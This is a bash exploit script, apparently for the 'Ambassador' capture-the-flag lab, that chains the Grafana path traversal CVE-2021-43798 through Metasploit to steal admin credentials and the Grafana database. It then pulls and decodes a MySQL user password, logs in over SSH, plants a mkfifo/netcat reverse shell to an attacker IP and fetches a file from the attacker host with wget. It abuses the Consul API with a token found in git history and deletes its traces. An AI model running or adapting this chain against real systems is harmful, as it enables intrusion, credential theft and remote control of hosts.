#!/bin/bash
#Requires an http listener on port 80
#Tested on Linux kali 5.19.0-kali2-amd64
#There is another method on the very bottom. It's commented out because I couldn't get the json config
#to work with curl without copy/pasting the config file into the -d flag. Basically, you take the 
#Authorization header from the HTTP request when supplying admin creds via URL. You put that header
#into the second curl request, cat the 'authkeys.json' file, copy output, paste after -d. It should
#succeed and give a file with a little over 1000kb, in which is the api key to use with querying the 
#grafana database via API.
#Also, I would have used curl to perform path traversal but I kept getting redirected to /login
#If anyone achieved this via curl, please let me know.



clear; echo '##########~~~Ambassador POC~~~##########'



###############################################################################
#Retrieves admin creds from /etc/grafana/grafana.ini using CVE-2021-43798 and Metasploit https://www.exploit-db.com/exploits/46074

echo; echo '##########~~~Acquiring credentials from grafana admin user using CVE-2021-43798~~~##########'

msfconsole -q -x 'use auxiliary/scanner/http/grafana_plugin_traversal; set RHOSTS 10.10.11.183; run; exit'

admincreds=$(cat ~/.msf4/loot/*grafana* | grep admin_password | cut -d' ' -f3)



###############################################################################
#Retrieves the grafana.db using path traversal vulnerability via Metasploit

echo; echo '##########~~~Acquiring grafana.db via path traversal vulnerability. Search CVE above~~~##########'

msfconsole -q -x 'use auxiliary/scanner/http/grafana_plugin_traversal; set RHOSTS 10.10.11.183; set FILEPATH /var/lib/grafana/grafana.db; run; exit'

grafanacreds=$(sqlite3 ~/.msf4/loot/*db 'select * from data_source;' | cut -d'|' -f8)



###############################################################################
#Retrieves creds from remote mysql database using grafana creds from CVE-2021-43798

echo; echo '##########~~~Retrieving creds from MySQL remote database~~~##########'

devcreds=$(mysql -u grafana -p${grafanacreds} -h 10.10.11.183 -D whackywidget \
-e "select pass from users where user='developer'" | tr -d '|' | sed -r 's/\s+//g' | grep -v 'pass' | base64 -d)

echo; echo '##########~~~Waiting...~~~##########'; sleep 7

[[ -z $devcreds ]] && echo 'problem with mysql connection' && exit



###############################################################################
#Ensure the 'port' number assigned in the json file is not surrounded by quotes;
#If so, this WILL lead to parsing errors from consul service
#The following will SSH to target with developer creds, generate the payload in tmp, get the file from preestablished http server on attack box,
#then sleep for 5 to give time to write file. Next, the consul API is used to write a service with the json file downloaded. This service will
#Initiate the payload, establishing a reverse shell to a listener on attack machine. Finally, cleanup is performed; the service is deregistered,
#and both the json file, and the payload are deleted.

echo; echo '##########~~~Connecting to target and setting up payload~~~##########'

sshpass -p $devcreds ssh developer@10.10.11.183 \
'echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.16.2 8500 > /tmp/f" > /tmp/serviceregister.sh; \
cd /opt/my-app/whackywidget; export CONSUL_HTTP_TOKEN=$(git show | grep token | cut -d" " -f5); cd ~; \
wget http://10.10.16.2:80/service2.json && sleep 5; \
curl -H "X-Consul-Token: $CONSUL_HTTP_TOKEN" -X PUT http://127.0.0.1:8500/v1/agent/service/register -T service2.json; \
sleep 12 && rm /tmp/serviceregister.sh && rm service2.json \
&& curl -H "X-Consul-Token: $CONSUL_HTTP_TOKEN" -X PUT http://127.0.0.1:8500/v1/agent/service/deregister/x13' \
&& echo && echo '##########~~~SSH command complete. Wait for connection. May take several seconds.~~~##########' || echo 'Failed!!!!!'



###############################################################################
#Logs into grafana application. Retrieves API key with admin privileges, and reads the grafana database via API
#https://grafana.com/docs/grafana/latest/developers/http_api/create-api-tokens-for-org/#how-to-create-a-new-organization-and-an-api-token

#curl http://admin:$admincreds@10.10.11.183:3000/login -v -L <--- might not be necessary

#curl http://10.10.11.183:3000/api/auth/keys -H 'Authorization: Basic YWRtaW46bWVzc2FnZUluQUJvdHRsZTY4NTQyNw==' -H 'Content-Type: application/json' -X POST -d '{
#        name: mykey,
#        role: Admin,
#        secondsToLive: 86400
#}' --output authResponse.txt
#
#authkey=$(cat authResponse.txt | cut -d ':' -f4 | tr -d '"' | sed s/}//)

#curl http://10.10.11.183:3000/api/datasources -H "Authorization: Bearer $apikey"
#Proceed normally from the mysql portion of the script
